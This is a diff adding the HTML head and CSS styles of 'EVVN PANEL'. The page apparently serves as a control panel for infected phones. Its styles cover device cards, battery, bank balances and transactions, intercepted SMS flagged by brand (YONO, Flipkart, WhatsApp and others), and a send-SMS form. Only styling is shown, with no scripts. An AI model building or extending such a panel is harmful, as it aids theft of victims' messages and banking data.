@@ -1,0 +1,2376 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+<meta name="theme-color" content="#0a0806">
+<title>EVVN PANEL</title>
+<link rel="icon" href="logo.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@500;600;700;800&family=Outfit:wght@300;400;500;600;700&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{
+  --bg:#0a0806;
+  --bg-2:#120e09;
+  --card:#181310;
+  --card-2:#1f1813;
+  --border:#3a2e1f;
+  --border-2:#5c4830;
+  --text:#f5ede0;
+  --text-2:#b8a890;
+  --text-3:#6e5f4a;
+  --gold:#d4a017;
+  --gold-2:#f0c040;
+  --gold-3:#ffdb70;
+  --gold-dark:#8a6a0c;
+  --gold-bg:rgba(212,160,23,.1);
+  --success:#3ecf8e;
+  --success-bg:rgba(62,207,142,.1);
+  --danger:#ef4444;
+  --danger-bg:rgba(239,68,68,.1);
+  --warning:#f59e0b;
+  --warning-bg:rgba(245,158,11,.1);
+  --radius:12px;
+  --radius-sm:8px;
+  --radius-lg:18px;
+  --shadow:0 2px 8px rgba(0,0,0,.4),0 8px 24px rgba(0,0,0,.25);
+  --gold-grad:linear-gradient(135deg,#d4a017 0%,#f0c040 50%,#8a6a0c 100%);
+  --font-display:'Cinzel',serif;
+  --font-ui:'Outfit',-apple-system,BlinkMacSystemFont,sans-serif;
+  --font-mono:'Space Mono',ui-monospace,monospace;
+}
+html,body{overflow-x:hidden}
+body{
+  background:var(--bg);
+  color:var(--text);
+  min-height:100vh;
+  font-family:var(--font-ui);
+  font-size:14px;
+  line-height:1.55;
+  -webkit-font-smoothing:antialiased;
+  -moz-osx-font-smoothing:grayscale;
+  background-image:radial-gradient(ellipse 80% 50% at 50% 0%,rgba(212,160,23,.06),transparent 70%);
+}
+.mono,.mono *{font-family:var(--font-mono);font-variant-numeric:tabular-nums}
+button{font-family:inherit;cursor:pointer;border:none;background:none;color:inherit;font-size:inherit}
+input,textarea,select{font-family:inherit;color:inherit;font-size:inherit}
+
+.logo-slot{position:relative;display:flex;align-items:center;justify-content:center;background:var(--bg-2);border:1px solid var(--border);overflow:hidden;flex-shrink:0;}
+.logo-slot img{width:100%;height:100%;object-fit:contain;display:block}
+
+/* ---------- GATE ---------- */
+#gate{position:fixed;inset:0;z-index:9999;background:radial-gradient(ellipse at top,#1a1308 0%,#0a0806 65%);display:flex;align-items:center;justify-content:center;padding:20px;overflow-y:auto;}
+#gate.hidden{display:none}
+.gate-card{width:100%;max-width:460px;background:linear-gradient(160deg,#1a1410 0%,#120e09 100%);border:1px solid var(--border-2);border-radius:var(--radius-lg);padding:36px 30px;box-shadow:var(--shadow),inset 0 1px 0 rgba(212,160,23,.15);position:relative;overflow:hidden;}
+.gate-card::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:var(--gold-grad);}
+.gate-brand{display:flex;align-items:center;gap:14px;padding-bottom:24px;margin-bottom:24px;border-bottom:1px solid var(--border);}
+.gate-brand .logo-slot{width:54px;height:54px;border-radius:14px;border-color:rgba(212,160,23,.3);box-shadow:0 4px 16px rgba(212,160,23,.25);}
+.gate-brand .name{font-family:var(--font-display);font-size:18px;font-weight:700;letter-spacing:1px;color:var(--gold-2);line-height:1.2;}
+.gate-brand .sub{font-size:11px;color:var(--text-3);margin-top:3px;letter-spacing:2px;text-transform:uppercase;font-weight:600}
+.gate-title{font-family:var(--font-display);font-size:17px;font-weight:600;margin-bottom:10px;letter-spacing:.5px;color:var(--gold-2)}
+.gate-desc{font-size:13px;color:var(--text-2);line-height:1.65;margin-bottom:24px}
+.chan-item{display:flex;align-items:center;gap:14px;padding:16px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius);margin-bottom:20px;transition:all .2s;}
+.chan-item.done{border-color:rgba(62,207,142,.5);background:var(--success-bg)}
+.chan-item .chk{width:24px;height:24px;border-radius:50%;border:2px solid var(--border-2);flex-shrink:0;display:flex;align-items:center;justify-content:center;transition:all .2s;}
+.chan-item.done .chk{border-color:var(--success);background:var(--success)}
+.chan-item .chk svg{opacity:0;transition:opacity .2s}
+.chan-item.done .chk svg{opacity:1}
+.chan-item .cinfo{flex:1;min-width:0}
+.chan-item .cname{font-size:13px;font-weight:600;color:var(--text);letter-spacing:.3px}
+.chan-item .curl{font-size:11px;color:var(--gold);margin-top:4px;font-family:var(--font-mono);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.chan-item .cbtn{padding:9px 18px;border-radius:var(--radius-sm);font-size:12px;font-weight:600;letter-spacing:.5px;background:var(--gold-grad);color:#1a1308;transition:all .2s;flex-shrink:0;box-shadow:0 2px 8px rgba(212,160,23,.3);}
+.chan-item .cbtn:hover{transform:translateY(-1px);box-shadow:0 4px 14px rgba(212,160,23,.45)}
+.chan-item.done .cbtn{background:var(--success);color:#0a0806;box-shadow:0 2px 8px rgba(62,207,142,.3)}
+.gate-progress{display:flex;align-items:center;gap:12px;padding:12px 14px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;color:var(--text-2);margin-bottom:18px;font-weight:500;}
+.gate-progress .bar{flex:1;height:4px;background:var(--border);border-radius:2px;overflow:hidden}
+.gate-progress .bar-inner{height:100%;background:var(--gold-grad);width:0%;transition:width .4s ease}
+.gate-continue{width:100%;padding:14px;border-radius:var(--radius);background:var(--gold-grad);color:#1a1308;font-family:var(--font-display);font-size:14px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;transition:all .2s;box-shadow:0 4px 16px rgba(212,160,23,.35);}
+.gate-continue:disabled{background:var(--card-2);color:var(--text-3);cursor:not-allowed;box-shadow:none}
+.gate-continue:not(:disabled):hover{transform:translateY(-2px);box-shadow:0 6px 22px rgba(212,160,23,.5)}
+.gate-foot{margin-top:20px;padding-top:16px;border-top:1px solid var(--border);font-size:10px;color:var(--text-3);text-align:center;letter-spacing:2px;font-weight:600;text-transform:uppercase;}
+
+/* ---------- APP ---------- */
+.app{display:none}
+.app.ready{display:block}
+
+.topbar{
+  display:flex;align-items:center;gap:16px;
+  padding:14px 24px;
+  background:rgba(10,8,6,.9);
+  border-bottom:1px solid var(--border);
+  position:sticky;top:0;z-index:90;
+  backdrop-filter:blur(16px);
+  -webkit-backdrop-filter:blur(16px);
+}
+.brand{display:flex;align-items:center;gap:12px;flex-shrink:0}
+.brand .logo-slot{width:40px;height:40px;border-radius:10px;border-color:rgba(212,160,23,.3);box-shadow:0 2px 10px rgba(212,160,23,.2);}
+.brand-text{display:flex;flex-direction:column;line-height:1.2}
+.brand-name{font-family:var(--font-display);font-size:15px;font-weight:700;letter-spacing:1px;color:var(--gold-2);}
+.brand-sub{font-size:9.5px;color:var(--text-3);letter-spacing:2px;text-transform:uppercase;margin-top:2px;font-weight:600}
+.search{flex:1;max-width:540px;position:relative}
+.search input{width:100%;padding:10px 16px 10px 42px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius);font-size:13px;color:var(--text);outline:none;transition:all .2s;font-weight:400;}
+.search input::placeholder{color:var(--text-3)}
+.search input:focus{border-color:var(--gold);background:var(--card);box-shadow:0 0 0 3px var(--gold-bg)}
+.search .search-ico{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:var(--text-3);pointer-events:none;display:flex;}
+.icon-btn{width:40px;height:40px;border-radius:var(--radius);background:var(--bg-2);border:1px solid var(--border);color:var(--text-2);display:flex;align-items:center;justify-content:center;transition:all .2s;flex-shrink:0;}
+.icon-btn:hover{color:var(--gold);border-color:var(--border-2);background:var(--card)}
+
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;padding:18px 24px 10px;}
+.stat{background:linear-gradient(160deg,var(--card) 0%,var(--bg-2) 100%);border:1px solid var(--border);border-radius:var(--radius);padding:16px 18px;min-width:0;position:relative;overflow:hidden;}
+.stat::before{content:"";position:absolute;top:0;left:0;width:3px;height:100%;background:var(--gold-grad)}
+.stat .lbl{font-size:10px;color:var(--text-3);letter-spacing:1.5px;text-transform:uppercase;font-weight:600;margin-bottom:8px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.stat .val{font-family:var(--font-mono);font-size:26px;font-weight:700;letter-spacing:-1px;line-height:1;font-variant-numeric:tabular-nums;}
+.stat.total .val{color:var(--gold-2)}
+.stat.online .val{color:var(--success)}
+.stat.offline .val{color:var(--gold-3)}
+.stat.bank .val{color:var(--warning)}
+
+.actions{display:flex;gap:12px;padding:12px 24px;border-bottom:1px solid var(--border);}
+.action-btn{flex:1;padding:12px 16px;background:var(--card);border:1px solid var(--border);border-radius:var(--radius);font-size:12.5px;font-weight:600;letter-spacing:.5px;color:var(--text-2);display:flex;align-items:center;justify-content:center;gap:10px;transition:all .2s;}
+.action-btn:hover{color:var(--gold);border-color:var(--border-2);background:var(--card-2);transform:translateY(-1px)}
+.action-btn .badge{background:var(--danger);color:#fff;font-family:var(--font-mono);font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px;min-width:20px;text-align:center;letter-spacing:0;}
+.action-btn .ico{display:flex;color:var(--text-3)}
+.action-btn:hover .ico{color:var(--gold-2)}
+
+.filters{display:flex;align-items:center;gap:8px;padding:12px 24px;border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none;}
+.filters::-webkit-scrollbar{display:none}
+.filter-chip{padding:7px 16px;border-radius:24px;font-size:12.5px;font-weight:600;letter-spacing:.3px;color:var(--text-2);border:1px solid transparent;white-space:nowrap;flex-shrink:0;transition:all .2s;}
+.filter-chip:hover{color:var(--text);background:var(--card)}
+.filter-chip.active{color:#1a1308;background:var(--gold-grad);border-color:var(--gold);font-weight:700;box-shadow:0 2px 10px rgba(212,160,23,.3);}
+.filters .sep{width:1px;height:20px;background:var(--border);margin:0 8px;flex-shrink:0}
+.filters select{padding:7px 12px;background:var(--bg-2);border:1px solid var(--border);border-radius:var(--radius-sm);font-size:12px;color:var(--text-2);outline:none;flex-shrink:0;font-weight:600;cursor:pointer;}
+.filters select:focus{border-color:var(--gold)}
+
+/* ---------- BRAND SCROLL ---------- */
+.brand-scroll-wrap{
+  display:flex;align-items:center;gap:10px;
+  padding:14px 24px;
+  border-bottom:1px solid var(--border);
+  overflow-x:auto;scrollbar-width:none;
+  background:var(--bg-2);
+}
+.brand-scroll-wrap::-webkit-scrollbar{display:none}
+.h-brand-chip{
+  display:flex;align-items:center;gap:9px;
+  padding:9px 16px;border-radius:28px;
+  background:var(--card);border:1px solid var(--border);
+  font-size:12.5px;font-weight:600;color:var(--text-2);
+  white-space:nowrap;flex-shrink:0;transition:all .2s;
+}
+.h-brand-chip:hover{background:var(--card-2);color:var(--text);border-color:var(--border-2)}
+.h-brand-chip.active{background:var(--gold-grad);border-color:var(--gold);color:#1a1308;box-shadow:0 3px 12px rgba(212,160,23,.4);}
+.h-brand-chip .dot{width:7px;height:7px;border-radius:50%;background:var(--border-2)}
+.h-brand-chip.active .dot{background:#1a1308}
+
+/* ---------- BRAND SECTION ---------- */
+.brand-section{
+  display:none;
+  border-bottom:1px solid var(--border);
+  background:var(--bg);
+}
+.brand-section.active{display:block;animation:fadeIn .25s ease-out}
+@keyframes fadeIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+
+.brand-head{
+  display:flex;align-items:center;gap:14px;
+  padding:16px 24px;
+  background:linear-gradient(160deg,var(--bg-2) 0%,var(--bg) 100%);
+  border-bottom:1px solid var(--border);
+}
+.brand-icon-box{
+  width:42px;height:42px;border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  flex-shrink:0;font-size:11px;font-weight:700;
+  font-family:var(--font-mono);letter-spacing:-.5px;
+  border:1px solid;
+}
+.brand-title{flex:1;min-width:0}
+.brand-title .bt{font-family:var(--font-display);font-size:15px;font-weight:700;letter-spacing:.5px}
+.brand-title .bs{font-size:11px;color:var(--text-3);margin-top:2px;font-weight:500}
+.brand-counts{display:flex;gap:8px;flex-shrink:0}
+.brand-count{
+  padding:6px 12px;border-radius:8px;
+  font-size:10.5px;font-weight:700;font-family:var(--font-mono);
+  display:flex;align-items:center;gap:6px;border:1px solid;
+  letter-spacing:.3px;
+}
+.brand-count .cd{width:6px;height:6px;border-radius:50%}
+.brand-count.used{color:var(--danger);background:var(--danger-bg);border-color:rgba(239,68,68,.3)}
+.brand-count.used .cd{background:var(--danger)}
+.brand-count.unused{color:var(--success);background:var(--success-bg);border-color:rgba(62,207,142,.3)}
+.brand-count.unused .cd{background:var(--success)}
+
+/* Brand color styles */
+.brand-yono .brand-icon-box{border-color:rgba(212,160,23,.5);color:var(--gold-2);background:rgba(212,160,23,.08)}
+.brand-yono .bt{color:var(--gold-2)}
+.brand-indane .brand-icon-box{border-color:rgba(245,158,11,.5);color:#fbbf24;background:rgba(245,158,11,.08)}
+.brand-indane .bt{color:#fbbf24}
+.brand-pvr .brand-icon-box{border-color:rgba(239,68,68,.5);color:#f87171;background:rgba(239,68,68,.08)}
+.brand-pvr .bt{color:#f87171}
+.brand-meesho .brand-icon-box{border-color:rgba(168,85,247,.5);color:#c084fc;background:rgba(168,85,247,.08)}
+.brand-meesho .bt{color:#c084fc}
+.brand-flipkart .brand-icon-box{border-color:rgba(59,130,246,.5);color:#60a5fa;background:rgba(59,130,246,.08)}
+.brand-flipkart .bt{color:#60a5fa}
+.brand-whatsapp .brand-icon-box{border-color:rgba(62,207,142,.5);color:#4ade80;background:rgba(62,207,142,.08)}
+.brand-whatsapp .bt{color:#4ade80}
+
+.brand-body{padding:14px 24px 24px}
+.brand-empty{text-align:center;padding:24px 0;font-size:12px;color:var(--text-3);}
+
+.card-tag{display:inline-block;font-size:9px;font-weight:700;padding:2px 6px;border-radius:4px;margin-left:6px;letter-spacing:.5px;font-family:var(--font-mono);vertical-align:middle;}
+.card-tag.used{background:var(--danger-bg);color:var(--danger);border:1px solid rgba(239,68,68,.3)}
+.card-tag.unused{background:var(--success-bg);color:var(--success);border:1px solid rgba(62,207,142,.3)}
+
+/* ---------- GRID / CARD ---------- */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(320px,1fr));gap:14px}
+.card{background:linear-gradient(160deg,var(--card) 0%,var(--bg-2) 100%);border:1px solid var(--border);border-radius:var(--radius);padding:16px;cursor:pointer;transition:all .2s;contain:layout style paint;content-visibility:auto;contain-intrinsic-size:auto 200px;position:relative;overflow:hidden;}
+.card::before{content:"";position:absolute;top:0;left:0;right:0;height:2px;background:var(--gold-grad);opacity:0;transition:opacity .2s}
+.card:hover{border-color:var(--border-2);transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,.3)}
+.card:hover::before{opacity:1}
+.card.online{border-left:3px solid var(--success)}
+.card.offline{border-left:3px solid var(--border-2)}
+.card.blacklisted{opacity:.5;border-style:dashed}
+
+.card-head{display:flex;align-items:flex-start;gap:12px;margin-bottom:14px}
+.card-head .dev-ico{width:38px;height:38px;border-radius:10px;background:var(--bg-2);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;color:var(--gold-2);}
+.card-head .dev-info{flex:1;min-width:0}
+.card-head .dev-name{font-family:var(--font-display);font-size:14px;font-weight:700;letter-spacing:.3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:4px;}
+.card-head .dev-id{font-family:var(--font-mono);font-size:10.5px;color:var(--text-3);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.card-head .cbtns{display:flex;gap:3px;flex-shrink:0}
+.card-head .sbtn{width:30px;height:30px;border-radius:8px;display:flex;align-items:center;justify-content:center;color:var(--text-3);transition:all .2s;}
+.card-head .sbtn:hover{color:var(--gold);background:var(--bg-2)}
+.card-head .sbtn.starred{color:var(--warning)}
+
+.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px 16px;margin-bottom:14px}
+.kv .k{font-size:10px;font-weight:600;color:var(--text-3);letter-spacing:1px;text-transform:uppercase;margin-bottom:5px;}
+.kv .v{font-size:13px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.kv .v.mono{font-family:var(--font-mono);font-size:12px}
+.kv .v.muted{color:var(--text-3);font-weight:400}
+.kv .v.fetching{color:var(--text-3);font-weight:400;font-size:12px;font-style:italic}
+
+.battery{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:600;font-family:var(--font-mono)}
+.battery .ico{width:24px;height:12px;border:2px solid currentColor;border-radius:3px;position:relative;padding:1.5px}
+.battery .ico::after{content:"";position:absolute;right:-4px;top:50%;transform:translateY(-50%);width:2.5px;height:6px;background:currentColor;border-radius:0 2px 2px 0}
+.battery .ico .fill{height:100%;border-radius:1.5px;background:currentColor}
+
+.bank-box{background:var(--bg-2);border:1px solid var(--border);border-radius:10px;padding:12px 14px;margin-bottom:12px}
+.bank-box .row1{display:flex;justify-content:space-between;align-items:center;gap:12px}
+.bank-box .bank{display:flex;align-items:center;gap:9px;min-width:0}
+.bank-box .bank-logo{width:22px;height:22px;border-radius:50%;background:var(--gold-grad);color:#1a1308;font-size:10px;font-weight:700;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.bank-box .bank-name{font-size:12px;font-weight:700;color:var(--gold-2);letter-spacing:.3px}
+.bank-box .bank-acc{font-family:var(--font-mono);font-size:11px;color:var(--text-3)}
+.bank-box .bank-amt{font-family:var(--font-mono);font-size:14px;font-weight:700;flex-shrink:0;color:var(--gold-3)}
+.bank-box .txn{margin-top:7px;font-size:11.5px;font-weight:600;font-family:var(--font-mono);display:flex;align-items:center;gap:5px}
+.bank-box .txn.credit{color:var(--success)}
+.bank-box .txn.debit{color:var(--danger)}
+
+.card-foot{display:flex;align-items:center;gap:8px;padding-top:10px;border-top:1px solid var(--border);font-size:12px;font-weight:600}
+.card-foot .dot{width:7px;height:7px;border-radius:50%;background:var(--border-2);flex-shrink:0}
+.card-foot.online .dot{background:var(--success);box-shadow:0 0 8px rgba(62,207,142,.6)}
+.card-foot.online .lbl{color:var(--success)}
+.card-foot.offline .dot{background:var(--text-3)}
+.card-foot.offline .lbl{color:var(--text-2)}
+.card-foot .right{margin-left:auto;font-size:11px;color:var(--text-3)}
+
+.empty{text-align:center;padding:70px 20px;color:var(--text-3)}
+.empty .t{font-size:14px;font-weight:500;color:var(--text-2)}
+.empty .s{font-size:12px;margin-top:8px}
+.spinner{width:32px;height:32px;border:3px solid var(--border);border-top-color:var(--gold);border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 16px}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.foot{padding:16px 24px;text-align:center;font-size:10px;color:var(--text-3);letter-spacing:2px;font-weight:600;text-transform:uppercase;border-top:1px solid var(--border);background:var(--bg-2)}
+
+/* ---------- DETAIL PANEL ---------- */
+.d-overlay{position:fixed;inset:0;z-index:1000;background:rgba(4,3,2,.75);backdrop-filter:blur(4px);display:flex;justify-content:flex-end;animation:fadeIn .2s}
+.d-panel{width:100%;max-width:500px;background:var(--bg);border-left:1px solid var(--border);display:flex;flex-direction:column;overflow:hidden;animation:slideIn .25s ease-out}
+@keyframes slideIn{from{transform:translateX(30px);opacity:0}to{transform:translateX(0);opacity:1}}
+.d-head{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:14px;background:linear-gradient(160deg,var(--card) 0%,var(--bg-2) 100%);flex-shrink:0}
+.d-head .info{flex:1;min-width:0}
+.d-head .name{font-family:var(--font-display);font-size:15px;font-weight:700;letter-spacing:.3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.d-head .meta{display:flex;align-items:center;gap:8px;font-size:11.5px;color:var(--text-2);margin-top:4px;font-weight:500}
+.d-head .meta .dot{width:7px;height:7px;border-radius:50%;background:var(--text-3)}
+.d-head .meta .dot.on{background:var(--success);box-shadow:0 0 6px rgba(62,207,142,.5)}
+.d-head .close{width:34px;height:34px;border-radius:8px;background:var(--bg-2);border:1px solid var(--border);color:var(--text-2);display:flex;align-items:center;justify-content:center;transition:all .2s}
+.d-head .close:hover{color:var(--gold);border-color:var(--border-2)}
+.d-tabs{display:flex;background:var(--card);border-bottom:1px solid var(--border);padding:0 16px;overflow-x:auto;flex-shrink:0;scrollbar-width:none}
+.d-tabs::-webkit-scrollbar{display:none}
+.d-tabs button{padding:13px 14px;font-size:12.5px;font-weight:600;letter-spacing:.3px;color:var(--text-2);border-bottom:2px solid transparent;white-space:nowrap;transition:all .2s}
+.d-tabs button:hover{color:var(--text)}
+.d-tabs button.active{color:var(--gold-2);border-bottom-color:var(--gold);font-weight:700}
+.d-content{flex:1;overflow-y:auto;padding:20px}
+.d-content::-webkit-scrollbar{width:6px}
+.d-content::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+
+.section{font-size:10px;font-weight:700;color:var(--text-3);letter-spacing:1.5px;text-transform:uppercase;margin:22px 0 12px;display:flex;align-items:center;gap:12px}
+.section::after{content:"";flex:1;height:1px;background:linear-gradient(90deg,var(--border),transparent)}
+.section:first-child{margin-top:0}
+
+.irow{display:flex;justify-content:space-between;padding:10px 0;gap:16px;border-bottom:1px solid var(--border);font-size:13px}
+.irow:last-child{border-bottom:none}
+.irow .l{color:var(--text-2);font-weight:500;flex-shrink:0}
+.irow .v{color:var(--text);font-weight:600;text-align:right;word-break:break-word;max-width:62%}
+.irow .v.mono{font-family:var(--font-mono);font-size:12px}
+.irow .v.hi{color:var(--gold-2)}
+.irow .v.used{color:var(--danger);font-weight:700}
+.irow .v.unused{color:var(--success);font-weight:700}
+
+.sms-item{background:linear-gradient(160deg,var(--card) 0%,var(--bg-2) 100%);border:1px solid var(--border);border-radius:10px;padding:12px 14px;margin-bottom:10px;font-size:12.5px}
+.sms-item .head{display:flex;justify-content:space-between;font-size:11.5px;font-weight:700;color:var(--gold-2);margin-bottom:6px;letter-spacing:.3px;gap:12px}
+.sms-item .head .time{color:var(--text-3);font-weight:500;font-family:var(--font-mono);flex-shrink:0;font-size:11px}
+.sms-item .body{color:var(--text-2);line-height:1.6;word-break:break-word;font-weight:400}
+.sms-item .from{font-size:11px;color:var(--text-3);margin-bottom:7px;font-weight:600;font-family:var(--font-mono)}
+.sms-item.brand-match{border-left:3px solid var(--danger)}
+
+.bank-item{background:linear-gradient(160deg,var(--card) 0%,var(--bg-2) 100%);border:1px solid var(--border);border-left:3px solid var(--warning);border-radius:10px;padding:12px 14px;margin-bottom:10px}
+.bank-item .row1{display:flex;justify-content:space-between;align-items:center;gap:12px}
+.bank-item .nm{font-size:13px;font-weight:700;color:var(--warning)}
+.bank-item .amt{font-family:var(--font-mono);font-size:14px;font-weight:700}
+.bank-item .raw{font-family:var(--font-mono);font-size:11px;color:var(--text-3);margin-top:7px;line-height:1.55;word-break:break-word}
+
+.form{display:flex;flex-direction:column;gap:16px}
+.form .lbl{font-size:10px;font-weight:700;color:var(--text-3);letter-spacing:1px;text-transform:uppercase}
+.sim-row{display:flex;gap:10px}
+.sim-row button{flex:1;padding:11px;background:var(--bg-2);border:1px solid var(--border);border-radius:10px;font-size:12.5px;font-weight:700;color:var(--text-2);transition:all .2s;letter-spacing:.3px}
+.sim-row button.active{background:var(--gold-bg);color:var(--gold-2);border-color:var(--gold)}
+.form input,.form textarea{background:var(--bg-2);border:1px solid var(--border);border-radius:10px;padding:12px 14px;font-size:13px;color:var(--text);outline:none;width:100%;transition:all .2s}
+.form input:focus,.form textarea:focus{border-color:var(--gold);background:var(--card);box-shadow:0 0 0 3px var(--gold-bg)}
+.form textarea{resize:vertical;min-height:90px;line-height:1.6}
+.btn-primary{padding:13px;border-radius:10px;background:var(--gold-grad);color:#1a1308;font-size:13px;font-weight:700;letter-spacing:.5px;transition:all .2s;box-shadow:0 3px 12px rgba(212,160,23,.3)}
+.btn-primary:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 5px 18px rgba(212,160,23,.45)}
+.btn-primary:disabled{opacity:.5;cursor:not-allowed}
+
+/* ---------- MODAL ---------- */
+.modal-overlay{position:fixed;inset:0;z-index:2000;background:rgba(4,3,2,.85);backdrop-filter:blur(5px);display:flex;align-items:center;justify-content:center;padding:16px;animation:fadeIn .18s}
+.modal{background:linear-gradient(160deg,var(--card) 0%,var(--bg-2) 100%);border:1px solid var(--border-2);border-radius:var(--radius-lg);width:100%;max-width:600px;max-height:90vh;overflow-y:auto;padding:24px;box-shadow:var(--shadow)}
+.modal.wide{max-width:720px}
+.modal::-webkit-scrollbar{width:6px}
+.modal::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+.modal-head{display:flex;align-items:center;justify-content:space-between;padding-bottom:16px;margin-bottom:18px;border-bottom:1px solid var(--border)}
+.modal-head h2{font-family:var(--font-display);font-size:16px;font-weight:700;letter-spacing:.5px;color:var(--gold-2)}
+.modal-head .close{width:32px;height:32px;border-radius:8px;background:var(--bg-2);border:1px solid var(--border);color:var(--text-2);display:flex;align-items:center;justify-content:center;transition:all .2s}
+.modal-head .close:hover{color:var(--gold);border-color:var(--border-2)}
+
+.src-item{background:var(--bg-2);border:1px solid var(--border);border-radius:10px;padding:14px;margin-bottom:10px}
+.src-item .top{display:flex;align-items:flex-start;gap:12px}
+.src-item .status{width:8px;height:8px;border-radius:50%;background:var(--text-3);flex-shrink:0;margin-top:7px}
+.src-item .status.ok{background:var(--success);box-shadow:0 0 6px rgba(62,207,142,.5)}
+.src-item .status.fail{background:var(--danger)}
+.src-item .info{flex:1;min-width:0}
+.src-item .url{font-family:var(--font-mono);font-size:12px;color:var(--text);word-break:break-all;margin-bottom:5px;line-height:1.5}
+.src-item .meta{font-size:11px;color:var(--text-3);font-weight:600;letter-spacing:.3px}
+.src-item .note-input{width:100%;margin-top:9px;padding:8px 12px;background:var(--bg);border:1px solid var(--border);border-radius:var(--radius-sm);font-size:12px;color:var(--text);outline:none;transition:all .2s}
+.src-item .note-input:focus{border-color:var(--gold)}
+.src-item .remove{padding:6px 12px;border-radius:var(--radius-sm);background:var(--danger-bg);border:1px solid rgba(239,68,68,.3);color:#fca5a5;font-size:11px;font-weight:700;transition:all .2s;flex-shrink:0}
+.src-item .remove:hover{background:rgba(239,68,68,.2);color:#fff}
+
+.form-group{margin-top:20px;padding-top:18px;border-top:1px solid var(--border)}
+.form-group h3{font-size:11px;font-weight:700;color:var(--text-2);letter-spacing:1px;text-transform:uppercase;margin-bottom:14px}
+.form-group input,.form-group textarea{width:100%;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:10px;font-size:13px;color:var(--text);outline:none;margin-bottom:10px;transition:all .2s}
+.form-group input:focus,.form-group textarea:focus{border-color:var(--gold);box-shadow:0 0 0 3px var(--gold-bg)}
+.form-group input::placeholder,.form-group textarea::placeholder{color:var(--text-3)}
+.form-group textarea{resize:vertical;min-height:90px;line-height:1.6;font-family:var(--font-mono);font-size:12px}
+.btn-block{width:100%;padding:13px;border-radius:10px;background:var(--gold-grad);color:#1a1308;font-size:13px;font-weight:700;letter-spacing:.5px;transition:all .2s;box-shadow:0 3px 12px rgba(212,160,23,.3)}
+.btn-block:hover:not(:disabled){transform:translateY(-1px);box-shadow:0 5px 18px rgba(212,160,23,.45)}
+.btn-block:disabled{opacity:.5;cursor:not-allowed}
+
+.notice{padding:13px 16px;background:var(--gold-bg);border-left:3px solid var(--gold);border-radius:0 10px 10px 0;font-size:12.5px;color:var(--text-2);line-height:1.6;margin-bottom:14px}
+.notice strong{color:var(--text);font-weight:700}
+.notice.warn{background:var(--warning-bg);border-left-color:var(--warning)}
+
+/* ---------- ALL SMS MODAL ---------- */
+.sms-toolbar{display:flex;gap:10px;align-items:center;flex-wrap:wrap;padding:12px 0;margin-bottom:10px;border-bottom:1px solid var(--border);position:sticky;top:-24px;background:var(--card);z-index:5}
+.sms-toolbar .count{flex:1;font-size:12px;color:var(--text-2);font-weight:600;letter-spacing:.3px;font-family:var(--font-mono);min-width:120px}
+.sms-toolbar .live{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--success);margin-right:8px;vertical-align:middle;animation:livePulse 1.6s ease-in-out infinite}
+@keyframes livePulse{0%,100%{opacity:1}50%{opacity:.4}}
+.sms-toolbar .chip{padding:6px 14px;border-radius:22px;background:var(--bg-2);border:1px solid var(--border);font-size:11.5px;font-weight:700;color:var(--text-2);letter-spacing:.3px;text-transform:uppercase;transition:all .2s}
+.sms-toolbar .chip:hover{color:var(--text);border-color:var(--border-2)}
+.sms-toolbar .chip.active{background:var(--gold-grad);color:#1a1308;border-color:var(--gold)}
+.sms-progress{display:none;margin-bottom:12px}
+.sms-progress.show{display:block}
+.sms-progress .bar{height:4px;background:var(--border);border-radius:2px;overflow:hidden}
+.sms-progress .bar > div{height:100%;background:var(--gold-grad);width:0%;transition:width .3s ease}
+.sms-progress .lbl{font-size:11px;color:var(--text-3);margin-top:6px;letter-spacing:.3px;text-align:center;font-family:var(--font-mono)}
+.sms-list{max-height:60vh;overflow-y:auto;padding-right:6px}
+.sms-list::-webkit-scrollbar{width:6px}
+.sms-list::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
+.sms-date{display:flex;align-items:center;gap:12px;font-size:10.5px;font-weight:700;color:var(--text-3);letter-spacing:1px;text-transform:uppercase;margin:16px 0 10px}
+.sms-date::before,.sms-date::after{content:"";flex:1;height:1px;background:var(--border)}
+.sms-foot{text-align:center;padding:16px 0 4px;font-size:11.5px;color:var(--text-3);font-weight:600;letter-spacing:.3px;border-top:1px solid var(--border);margin-top:16px}
